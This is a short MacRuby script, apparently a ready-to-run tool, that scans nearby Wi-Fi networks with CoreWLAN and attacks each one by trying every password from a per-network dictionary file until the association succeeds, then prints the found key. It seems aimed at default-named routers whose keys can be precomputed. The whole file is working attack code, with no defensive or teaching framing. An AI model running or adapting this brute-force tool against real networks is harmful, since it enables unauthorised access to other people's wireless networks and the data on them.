#!/usr/bin/env macruby
framework "CoreWLAN"

iface = CWInterface.interface
iface.disassociate

IGNORE = %w[WLAN_62B9 WLAN_C8E0 WLAN_C059]

if focus = ARGV.shift
  puts "Focusing on #{focus}"
end

wlans = iface.scanForNetworksWithParameters(nil, error: nil)

puts "Found #{wlans.length} networks"

wlans.each do |wlan|

  next if IGNORE.include?(wlan.ssid)
  dict = 'dict/' + wlan.ssid
  next unless File.exist?(dict)

  if focus
    next unless wlan.ssid == focus
  end

  keys = IO.readlines(dict).reverse

  keys.reject! do |key|
    key.chop!

    key =~ /Essid:#{wlan.ssid}/ or key.empty? or key =~ /^WPAmagickey_v/
  end

  puts "starting #{wlan.ssid} with #{keys.length}"

  keys.each_with_index do |key, index|
    print "."
    # puts "CURRENT KEY: #{key} (#{index+1}/#{keys.size})"
    p = Pointer.new(:object)
    if iface.associateToNetwork(wlan, password: key, error: p)
      print "\n"
      puts "KEY for #{wlan.ssid} FOUND: #{key}"
      break
    else
      error = p[0]
      puts error.code
      unless error.code == -3924
        puts error[0].inspect
        retry
      end
    end
  end
end

